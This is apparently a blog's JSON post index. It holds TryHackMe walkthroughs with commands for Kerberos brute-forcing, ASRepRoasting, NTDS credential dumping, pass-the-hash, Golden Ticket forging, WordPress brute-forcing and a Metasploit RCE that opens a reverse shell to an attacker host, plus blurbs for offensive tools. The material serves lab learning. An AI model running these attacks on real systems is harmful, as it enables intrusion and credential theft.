}            else {                res.json({success: false});            }        } catch (error) {            res.json({success: false, error});        }    })app.listen(PORT, () =&gt; {    console.log(`Server is running on http://localhost:${PORT}`);});Schema.prismadatasource db {  provider = \"sqlite\"  url      = \"file:./database.db\"}generator client {  provider = \"prisma-client-js\"}model User {  id        Int      @id @default(autoincrement())  createdAt DateTime @default(now())  name      String   @unique  password  String  posts     Post[]}model Post {  id        Int      @id @default(autoincrement())  createdAt DateTime @default(now())  updatedAt DateTime @updatedAt  published Boolean  @default(false)  title     String     body      String  author    User    @relation(fields: [authorId], references: [id])  authorId  Int}"
  },
  
  {
    "title": "xsserve",
    "url": "/posts/xsserve/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-12-30 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis tool simplifies XSS exploitation by combining a socket-based HTTP server with the power of ngrok. It enables you to quickly launch a local server and make it publicly accessible, making...",
    "content": "🚀 UsageThis tool simplifies XSS exploitation by combining a socket-based HTTP server with the power of ngrok. It enables you to quickly launch a local server and make it publicly accessible, making it easier to share payloads or demonstrate XSS vulnerabilities.There are basically three endpoints:            Endpoint      What does it to                  /FILENAME      Serves the file named FILENAME in files/ directory, like a standard HTTP server.              /?cookie=XXX      Only logs the value of XXX, useful for testing cookie capture scenarios.              /*      Logs any access to other endpoints in your console, giving you full visibility into unexpected requests.      Ideal for pentesters, security researchers, and cybersecurity enthusiasts who need a lightweight and versatile tool for XSS testing.SourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Attacktive Directory",
    "url": "/posts/thm-attacktivedirectory/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, active-directory, impacket, asreproast, kerberos, golden-ticket",
    "date": "2024-12-29 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium guided room on TryHackMe. We’ll explore the exploitation of a vulnerable Domain Controller via ASRepRoasti...",
    "content": "IntroductionHello everyone, today we’ll be taking a look at Attacktive Directory, a Medium guided room on TryHackMe. We’ll explore the exploitation of a vulnerable Domain Controller via ASRepRoasting with impacket, and as a bonus we’ll cover the generation of Golden Tickets. Let’s get started.  Enumeration          Portscan      SMB (139,445)      Enumerating users        Exploitation          ASRepRoasting      Re-Enumerating SMB        Privesc          Secretsdump      Getting flags        Bonus          Generating Golden Tickets      EnumerationPortscanIt’s not asked but let’s start with a port scan. As always, I use rustscan and specify the nmap options with the -- NMAP_OPTIONS syntax. In this case, we’re scanning for service versions and outputting the result to a file named all_ports.txt.rustscan -a $TARGET_IP -- -sV -oN all_ports.txtPORT      STATE SERVICE       REASON  VERSION53/tcp    open  domain        syn-ack Simple DNS Plus80/tcp    open  http          syn-ack Microsoft IIS httpd 10.088/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-12-29 12:52:00Z)135/tcp   open  msrpc         syn-ack Microsoft Windows RPC139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)445/tcp   open  microsoft-ds? syn-ack464/tcp   open  kpasswd5?     syn-ack593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp   open  tcpwrapped    syn-ack5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp  open  mc-nmf        syn-ack .NET Message Framing------- a few MSRPC ports used internally, not relevant What do we learn from this portscan ?  The target is likely a Domain Controller  The target is part of a domain named spookysec.local  There are ton of services runningSMB (139, 445)Since it’s a guided room, we don’t have to explore all the services. Let’s map the domain spookysec.local to the the DC’s IP:echo \"$TARGET_IP spookysec.local\" &gt;&gt; /etc/hostsNext let’s enumerate smb with the enum4linux tool. Here is the output where I removed the irrelevant parts:┌──(kali㉿kali)-[~/Chall/THM/Attacktivedirectory/Enum]└─$ enum4linux $TARGET_IP[+] Server 10.10.60.35 allows sessions using username '', password ''Domain Name: THM-ADDomain Sid: S-1-5-21-3591857110-2884097990-301047963\tSharename       Type      Comment\t---------       ----      -------Reconnecting with SMB1 for workgroup listing.Unable to connect with SMB1 -- no workgroup availableS-1-5-21-3591857110-2884097990-301047963-500 THM-AD\\Administrator (Local User)S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\\Guest (Local User)S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\\krbtgt (Local User)We get the NetBIOS-Domain name and some users that we could try to Kerberoast / ASRepRoast … More on that later.Answering questions  What tool will allow us to enumerate port 139/445?enum4linux is a well-known tool that allows you to enumerate information from Windows and Samba systems.  What is the NetBIOS-Domain Name of the machine?THM-AD  What invalid TLD do people commonly use for their Active Directory Domain?Earlier, we saw in the portscan that the FQDN  was spookysec.local. The TLD (Top Level Domain) is basically the “extension”, in our case it’s .local.Enumerating usersWe are asked to use kerbrute with this username wordlist to bruteforce users from the Active Directory by attacking Kerberos, so let’s do that:kerbrute usernum --dc \"$TARGET_IP\" -d \"$DOMAIN_NAME\" \"$WORDLIST\"Kerbrute found a few AD usersI will put thoses usernames in a file before continuing:AdministratorGuestDefaultAccountWDAGUtilityAccountjamessvc-adminrobindarkstarbackupparadoxAnswering questions  What command within Kerbrute will allow us to enumerate valid usernames?userenum.  What notable account is discovered? (These should jump out at you)svc-admin (for service admin) seems interesting.  What is the other notable account is discovered? (These should jump out at you)backup could also potentially be interesting.ExploitationASRepRoasting  Impacket has a tool called “GetNPUsers.py” that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.You can learn more about ASRepRoasting here. Basically, we query the Key Distribution Center (KDC) for TGTs (Ticket Granting Tickets) as other users. If the user is vulnerable to ASRepRoasting, the KDC will send us a TGT that we’ll attempt to crack to obtain the user’s passwordLet’s use the GetNPUsers script from Impacket to search for ASRepRoastable users and ask the KDC for TGTs as those users. You can learn more about this script here.impacket-GetNPUsers -dc-ip $TARGET_IP \"$DOMAIN_NAME/\" -usersfile $USERS_FOUND_WITH_KERBRUTEsvc-admin is ASRepRoastableAnd use john to crack this kerberos AS-REP:$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:542ffcaff5ff973571221ce247639de5$5c015375d1747520c65cfd0e274742646078ed1bbc30bf1e9dd63fa32be9d663e62ec8271864c9ba8fa7a299f3802b2faff8dfd6d1684682eb82d8a22b6da935f890fa490ba3767331584e16c4622407ab473e2c190a22a470e9fed5750a49234d0099b44f9e0f180c96e492d614bc137226a8f872c4c731a6ab03ef88ced8014c32e180d8b7afcd404602d8bad7a6bcda4b97107aef337ab9192ffcc7c23a6f8b6f9101cc006d39c2188c1aa4fc31d87bde8737465ee6d31a13d36538b9381143d295a158a6602792d48fbf4119028f9ca7b233def4de701fa339d8eb332ec9fcb9c4b6662710a72bf35601d0b7d79c7aaaBingo !Answering questions  We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?svc-admin  Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)Kerberos 5 AS-REP etype 23, as seen from the John output.  Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)18200 found using hashcat --help | grep -i kerberos  Now crack the hash with the modified password list provided, what is the user accounts password?management2005Re-Enumerating SMB  With a user’s account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.smbclient -L \"//10.10.60.35/\" -U \"svc-admin%management2005\"We have access to 6 shares nowWhat do we learn from the smbclient output ?            Share name      Description      Default share ?                  ADMIN$      Provide remote access to the system root      Yes              backup             No              IPC$      Inter-Process Communication      Yes              NETLOGON      Store and distribute logon scripts, policies etc      Yes              SYSVOL      Store and replicate domain-wide files like GPO, GPP …      Yes      Enumerating non-defaults shares first is often a good idea:smbclient \"//10.10.60.35/backup\" -U \"svc-admin%management2005\"YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYwLooks like base64, let’s decode it from the terminal:┌──(kali㉿kali)-[~/Chall/THM/Attacktivedirectory/Exploit]└─$ cat backup_credentials.txt | base64 -dbackup@spookysec.local:backup2517860   And we retrieve the backup credentials.Answering questions  What utility can we use to map remote SMB shares?smbclient is a straightforward tool that we can use for this task  Which option will list shares?-L, found by reading the help menu  How many remote shares is the server listing?6  There is one particular share that we have access to that contains a text file. Which share is it?backup  What is the content of the file?YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw  Decoding the contents of the file, what is the full contents?backup@spookysec.local:backup2517860PrivescSecretsdump  The backup account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes.Interesting ! That means that we can probably dump Domain Credentials using a tool like secretsdump:impacket-secretsdump -just-dc \"$DOMAIN/$USERNAME:$PASSWORD@$TARGET_IP\"And we get all the NTLM hashesAdministrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::We can authenticate with the Administrator hash without having to crack it (using pass-the-hash), and with krbtgt hash, we can create Golden Tickets (more on that later).Answering questions  What method allowed us to dump NTDS.DIT?DRSUAPI  What is the Administrators NTLM hash?The hashes are in the format LM:NT, so the response is 0e0363213e37b94221497260b0bcb4fc  What method of attack could allow us to authenticate as the user without the password?Pass The Hash  What method of attack could allow us to authenticate as the user without the password?-HGetting flagsThere are several tools that supports pass-the-hash and that could allow us to get an Administrator shell on the Domain Controller:  impacket-psexec  impacket-smbexec  impacket-wmiexec  evil-winrmLet’s go with evil-winrm:evil-winrm -i \"$TARGET\" -u \"$USERNAME\" -H \"$NT_HASH\" We succesfully used the pass-the-hash method to authenticate as adminAnd we can display grab the 3 flagsBonusGenerating Golden TicketsI always forget the commands so this section serves like a memo. You can learn more about silver and golden tickets here.Let’s start by getting the Domain SID. From evil-winrm, we type:*Evil-WinRM* PS C:\\&gt; (Get-ADDomain).DomainSID.Value S-1-5-21-3591857110-2884097990-301047963We already have the NT hash of the krbtgt account, which is:0e2eb8158c27bed09861033026be4c21We can generate our Golden Tickets using impacket-ticketer:impacket-ticketer -nthash $KRBTGT_NT_HASH \\            -dc-ip $DC_IP \\            -domain-sid $DOMAIN_SID \\            -domain $DOMAIN_NAME \\            $USERNAMEWe’ve succesfully generated a Golden TicketNext we need to export a variable that will store the path to the generated Golden Ticketexport KRB5CCNAME=\"$(pwd)/$USERNAME.cache\"Finally, we can use whatever script for the impacket suite that we wan’t, using the -k -no-pass options to specify that we wan’t to authenticate using the kerberos ticket:We are connected as admin without having to authenticate"
  },
  
  {
    "title": "Blog",
    "url": "/posts/thm-blog/",
    "categories": "Writeups, TryHackMe",
    "tags": "writeups, tryhackme, web, wordpress, smb, wpscan, metasploit, pwncat, linux-privesc",
    "date": "2024-12-28 16:00:00 +0000",
    





    
    "snippet": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, ...",
    "content": "IntroductionHello everyone, today we will be taking a look at Blog, a Medium rated room on TryHackMe. We will explore the exploitation of a vulnerable Wordpress website with wpscan and metasploit, before moving on to the privilege escalation phase using tools like pwncat, LinPEAS and ltrace. Let’s get started !  Enumeration          Portscan      SMB (139,445)      HTTP (80)                  Manual enumeration          Wpscan                    Searchsploit        Exploitation          Testing searchsploit exploit      Bruteforcing WordPress      Getting RCE        Privesc          Pwncat      User flag … or not      Manual enumeration      Linpeas      SUID Binary      EnumerationPortscanFirst the room asks us to map the blog.thm domain name to the $TARGET_IP in /etc/hosts, so I started by doing that.As always, I like to begin with a port scan. For this I use rustscan. It’s basically a Rust-based port scanner that detects open ports, and then launches an nmap scan only on the discovered ports. You can specify options to the subsequent nmap scan by using the -- NMAP_OPTIONS syntax. I like to go with -sV for identification of services version, and -oN ports to save the result to a file named all_ports.txt.rustscan -a $TARGET_IP -- -sV -oN all_ports.txtPORT    STATE SERVICE     REASON  VERSION22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp  open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernelWhat do we learn from this portscan ?  The target is a Linux system  SSH, HTTP and SMB are runningSMB (139, 445)I always start by enumerating SMB because it’s relatively quick and we often find juicy files. So I started with an smbclient:┌──(kali㉿kali)-[~]└─$ smbclient -L \"//$TARGET_IP\" -U \"%\"\tSharename       Type      Comment\t---------       ----      -------\tprint$          Disk      Printer Drivers\tBillySMB        Disk      Billy's local SMB Share\tIPC$            IPC       IPC Service (blog server (Samba, Ubuntu))When using smbclient, you can specify a username and a password with the following syntax: -U \"username%password\". So -U \"%\" essentially means blank username, blank password.            Share name      Description      Default share ?                  ADMIN$      Store printer drivers and related files      Yes              BillySMB             No              IPC$      Inter-Process Communication      Yes      Let’s explore BillySMB:┌──(kali㉿kali)-[~]└─$ smbclient \"//$TARGET_IP/BillySMB\" -U \"%\"`Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Tue May 26 20:17:05 2020  ..                                  D        0  Tue May 26 19:58:23 2020  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020  check-this.png                      N     3082  Tue May 26 20:13:43 2020\t\t15413192 blocks of size 1024. 9788764 blocks availablesmb: \\&gt; mget *Open thunar to get a general overview:SMB filesAlice-White-Rabbit.jpg is a JPG file, so I want to try some steganography tricks with an empty passphrase:┌──(kali㉿kali)-[~]└─$ steghide extract -sf Alice-White-Rabbit.jpgEnter passphrase: wrote extracted data to \"rabbit_hole.txt\"┌──(kali㉿kali)-[~]└─$ cat rabbit_hole.txtYou ve found yourself in a rabbit hole, friend.check-this.png  appears to be a QR code, so let’s scan it using zbarimg:┌──(kali㉿kali)-[~]└─$ zbarimg check-this.png QR-Code:https://qrgo.page.link/M6dEscanned 1 barcode symbols from 1 images in 0 secondsWe could enumerate further, using tools like exiftool and binwalk, tryna look at the .mp4 file and so on, but seems like this SMB server is just a rabbit hole. I also ran enum4linux to double check, but nothing interesting came up. Let’s move on.HTTP (80)You can learn more about WordPress enumeration in here.Seems like WordPress is runningManual enumerationAs you can see on the index page, the post has been written by Karen WheelerThere is a little trick that you can use to enumerate other users. Simply add ?author=X where X is a number at the end of the URL:I tried it with X=2 but it returned a 404 Not Found, so there are only two users on this WordPress website.Let’s try to login manually. Note that we cannot login with Karen Wheeler or Billy Joel as username, we need to login with their wordpress generated usernames, the first letter of the firstname and the lastname:        WpscanHere is the wpscan with irrelevant parts removed:┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP[+] robots.txt found: http://10.10.132.87/robots.txt | Interesting Entries: |  - /wp-admin/ |  - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100%[+] Upload directory has listing enabled: http://10.10.132.87/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) |  - http://10.10.132.87/, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=5.0' | Confirmed By: Meta Generator (Passive Detection) |  - http://10.10.132.87/, Match: 'WordPress 5.0'[i] No plugins Found.I checked the /wp-content/uploads/ folder since it has directory listing enabled, but found nothing interesting there. Version is 5.0 which is quite old, so let’s search for potential exploits.SearchsploitWordpress 5.0 is an old version (the latest version is 6.7), so running searchsploit against this version might be a good ideaSearchsploit found a lot of exploits that match this WP versionThere are a ton of exploits, but only 5 of them affect WordPress itself and only 4 are of interest (the fifth is a DoS exploit).The others exploits target WP plugins, but we know from the wpscan that there are no plugins installed here. So we only need to test 4 exploits.The relevant exploitsWe have gathered enough information from the enumeration phase. Let’s move on to the exploitation part.ExploitationTesting searchsploit exploits            Exploit name      Problem                  php/webapps/49512.py      Authenticated              php/webapps/46511.js      Authenticated              php/remote/46662.rb      Authenticated              multiple/webapps/47690.md      Didn’t work      Bruteforcing WordPressSince all exploits are authenticated and we don’t have credentials, let’s try a dictionary attack with wpscan. First we will create the user wordlist, then launch the attack:┌──(kali㉿kali)-[~]└─$ echo -e \"bjoel\\nkwheel\" &gt; real_users.txt┌──(kali㉿kali)-[~]└─$ wpscan --url http://$TARGET_IP/ -U real_users.txt -P $PASSWORD_WORDLISTI started by trying the 2020-200_most_used_passwords.txt and the 2023-200_most_used_passwords.txt wordlists from SecLists but nothing came up. So I decied to be patient, and used the rockyou.txt wordlist. After a few minutes I got this:[+] Performing password attack on Xmlrpc against 2 user/s[SUCCESS] - kwheel / cutiepie1^C[!] Valid Combinations Found: | Username: kwheel, Password: cutiepie1 Getting RCEWe finally have our needed credentials: kwheel:cutiepie1. Let’s use the metasploit authenticated exploit that we found earlier.┌──(kali㉿kali)-[~]└─$ msfconsolemsf6 &gt; use exploit/multi/http/wp_crop_rceAfter typing show options, we notice that some parameters need to be configured.msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set USERNAME kwheelmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set PASSWORD cutiepie1msf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set RHOSTS $TARGET_IPmsf6 exploit(exploit/multi/http/wp_crop_rce) &gt; set LHOST $ATTACKER_IPWithin a few seconds, we’re greeted with a meterpreter session.PrivescPwncatThe meterpreter is cool but I prefer to use pwncat. So I setup the pwncat reverse listener in another terminal, and run a reverse shell from the meterpreter session like this:From meterpreter to pwncatUser flag … or notI tried to cat the user flag, but I got trolled:(remote) www-data@blog:/var/www/wordpress$ cat /home/bjoel/user.txtYou won't find what you're lookif for here.TRY HARDERLooking into the bjoel home directory, I came across a PDF. Downloaded it using pwncat and opened it:Joel was working for Rubber DuckyThis might be a clue, perhaps the flag is in /media/ or something:Not a big deal, we’ll search for the user flag once we have root access.Manual enumerationLet’s start by enumerating the users that have a connection shell(remote) www-data@blog:/var/www/wordpress$ cat /etc/passwd | grep bashroot:x:0:0:root:/root:/bin/bashbjoel:x:1000:1000:Billy Joel:/home/bjoel:/bin/bashNext, let’s grab the content of the wp-config.php file. This file contains information required by WordPress to connect to the database such as:  db name  db host  db username  db password(remote) www-data@blog:/var/www/wordpress$ cat wp-config.php | grep DB_define('DB_NAME', 'blog');define('DB_USER', 'wordpressuser');define('DB_PASSWORD', 'LittleYellowLamp90!@');Tried using the database password to su bjoel and su root, but unfortunately it didn’t work. Next, I extracted the password for the bjoel WordPress user from the MySQL database and I attempted to crack it with john, but … my CPU ain’t powerful enough. Time for automated enumeration I guess.LinpeasNote: with pwncat, you can switch between the attacker’s shell and the victim’s shell by pressing Ctrl + D.Look at the last lineIt looks like there is an unknown SUID binary ! SUID (Set User ID) is a special permission with one key function: the binary executes as the user who owns the file. This means that if the binary is owned by root, it will execute with root privileges, even if launched by the www-data user. Therefore, it’s a significant privesc vector. More on that here.SUID binaryWhen we run the binary, it says “Not an Admin”. Let’s download it locally and try to ltrace it to examine dynamic libraries and syscall done by the binary:Downloading it with the help of pwncatAnalyzing it with ltraceFrom the ltrace output, we see that the binary checks the admin variable from the environment with the getenv() function. So we can just modify the admin env variable and set it to true. Once we do that we can grab our flags !Rooted !We use the find command to search for the real user.txt flag, which was indeed located in the /media/usb/, just as we suspected ."
  },
  
  {
    "title": "wpsh",
    "url": "/posts/wpsh/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-12-25 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. ...",
    "content": "🚀 UsageThis script allows you to exploit a WordPress instance to obtain a reverse shell by editing the 404.php theme page. It requires the username and password of a valid WordPress administrator. Once authenticated, the script establishes a reverse shell, granting access to the remote instance.wpsh help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "arpspoofer",
    "url": "/posts/arpspoofer/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2024-11-28 16:00:00 +0000",
    





    
    "snippet": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect netwo...",
    "content": "🚀 UsageThis tool allows you to perform an ARP cache poisoning attacks between two targets (a victim and a gateway) on a local network. It manipulates the ARP tables of the victims to redirect network traffic through the attacker, enabling interception or modification of data.  In the help menu, you can see -g GATEWAY and -t TARGET. However, if you want to capture traffic between two victims without one of them being the gateway, you can still use this tool with -g TARGET1 and -t TARGET2.arpspoofer help menuSourceThe source code and installation instructions are accessible here."
  },
  
  {
    "title": "Todo.js",
    "url": "/posts/todojs/",
    "categories": "Web Dev, React",
    "tags": "",
    "date": "2024-07-04 16:00:00 +0000",
    





    
    "snippet": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more...",
    "content": "General overviewTo gain more experience with React and the localStorage API, I developed a dynamic to-do app with various features such as a search bar, a checkbox to hide completed tasks, and more. Tasks are stored in localStorage, ensuring that all modifications are persisted. Finally, the frontend is built using Tailwind.          SourceThe source code and installation instructions are accessible here.You can also test it directly in here."
  },
  
  {
    "title": "FTPy",
    "url": "/posts/ftpy/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools",
    "date": "2023-05-11 16:00:00 +0000",
    





    
    "snippet": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewComm...",
    "content": "This project is basically a simplified FTP client, which, through an established socket, allows connecting and performing FTP exchanges, such as sending, retrieving, or deleting a file.OverviewCommandsAuth  USER  PASSInteraction with files  PASV  LIST (ls)  RETR (get)  STOR (put)Interaction with filesystem  CD (cd)  PWD (pwd)  MKD (mkdir)  DELE (rm)  CHMOD (chmod)SourceThe source code and installation instructions are accessible here"
  },
  
  {
    "title": "Laravel Cybershop",
    "url": "/posts/laravel-ecommerce/",
    "categories": "Web Dev, Laravel",
    "tags": "",
    "date": "2023-04-23 16:00:00 +0000",
    





    
    "snippet": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, s...",
    "content": "This project was my first project with the Laravel framework. I wanted to create a dynamic E-Commerce website, so I choose to use the Laravel/Livewire tech stack. Additionally, I used vanilla JS, some library like HTMX and Swiper, and Bootstrap for the front end part. I also used the Pusher websocket to create real-time notifications.General overviewThe products are sorted by categories. Each category has its own search bar, and there is a general search bar that searches across all categories. On the product display pages, you can see the products, their names, categories, prices, and average rating.          LoginYou can create an account with whatever email address you want, but you’ll need to validate it by clicking on the link sent by email. You can reset your password using the same email address.          As you can see, livewire is used for the dynamic validation here.ProductYou can sell a product by adding it in the “market” section. Give it a name, a price, a category, and a main image. You can also add secondary images. Finally, a MD-like editor is available for the product description (bold, italic, list, strikethrough text, links and so on).The drag &amp; drop functionnality is done with filepond.js.          CommentsYou can leave a comment on any product by adding a title, a rating, and your comment. Again, a markdown-like editor is available to help you style your text. Finally, you can “heart” other people’s comments.          SettingsYou can customize your profile by changing your profile picture, email, or password. There is also a profile page displaying the products you are selling, the number of hearts your comments have received, your average product rating, the number of comments you have made, and a list of your recent comments.          PaymentWhen you add a product to your cart, it appears in the small dynamic cart icon in the navbar. Clicking on this cart icon takes you to a more detailed page where you also have the option to buy by making the payment (we have chosen to use Stripe).          I chose Livewire for the dynamic cart page.ChatboxThere is a chat that allows you to interact with sellers or other clients. It is dynamic and supports sending messages as well as images. Additionally, the notification component in the navbar uses WebSockets, making it real-time. Therefore, you will receive notifications instantly as they happen.          The dynamic notification component is updated using livewire + pusher.js websocket.SourceThe source code and installation instructions are accessible here.You’ll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "PHP Chat",
    "url": "/posts/php-webchat/",
    "categories": "Web Dev, PHP",
    "tags": "",
    "date": "2023-02-16 16:00:00 +0000",
    





    
    "snippet": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentica...",
    "content": "In order to gain experience with API development and some concepts like interactivity, designing a responsive UI, and so on, i made a PHP chat with a backend based on a PHP API to manage authentication and messages, coupled with a MariaDB database.On the other hand, the front-end is entirely handled by JavaScript with AJAX requests, and by Bootstrap + Vanilla CSS for the CSS part.Login          As you may noticed, the validation is done with AJAX, so it’s dynamic.Chat          The &lt;form&gt; is directly posted to the API. However, the update and delete fonctionnalities are done in JavaScript with AJAX requests.Settings page          The validation of the entered password is also done with AJAX requests.SourceThe source code and installation instructions are accessible hereYou’ll also find a docker-compose file there if you want to test the application locally."
  },
  
  {
    "title": "CVE-2011-2523 POC",
    "url": "/posts/cve-2011-2523/",
    "categories": "Hacking tools, Python",
    "tags": "hacking-tools, poc",
    "date": "2022-06-02 16:00:00 +0000",
    





    
    "snippet": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructio...",
    "content": "2022-06-03-vsftpdexploit🚀 UsageThis poc script allows you to exploit the CVE-2011-2523 (VsFTPd 2.3.4 Backdoor Command Execution)POC script help menuSourceThe source code and installation instructions are accessible here."
  }
  
]

